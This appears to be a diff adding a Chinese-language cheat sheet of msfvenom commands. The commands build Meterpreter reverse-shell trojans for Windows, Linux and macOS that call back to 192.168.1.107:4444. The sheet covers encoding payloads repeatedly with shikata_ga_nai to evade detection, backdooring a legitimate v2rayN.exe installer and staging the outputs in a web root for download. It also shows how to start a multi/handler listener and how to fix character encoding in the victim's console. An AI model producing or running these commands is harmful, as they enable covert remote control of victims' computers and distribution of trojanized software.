@@ -1,0 +1,35 @@
+编译一次：
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.107 lport=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/1.exe
+
+
+编译两次：
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.107 lport=4444 -b "\x00" -e x86/shikata_ga_nai -i 20 | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/2.exe
+
+
+
+监听：
+在MSF上启动handler开始监听后门程序
+1，use exploit/multi/handler 
+2，set playload windows/meterpreter/reverse_tcp
+
+
+解决linux连接windows电脑中文乱码问题：
+在目标dos上输入：
+chcp 65001
+
+
+
+在软件上加后门：
+
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.107 lport=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -x v2rayN.exe -f exe -o /var/www/html/v2rayN2.exe
+
+
+
+生成linux下的可执行木马程序：
+msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.107 lport=4444 -b "\x00"  -i 10 -f elf -o /var/www/html/demo
+
+(注意，因为生成时指定的payload是：linux/x64/meterpreter/reverse_tcp，所以在msf监听时也要指定这个payload，否则会报错)
+
+
+生成mac下的木马程序
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.1.107 lport=4444 -f macho > shell.macho
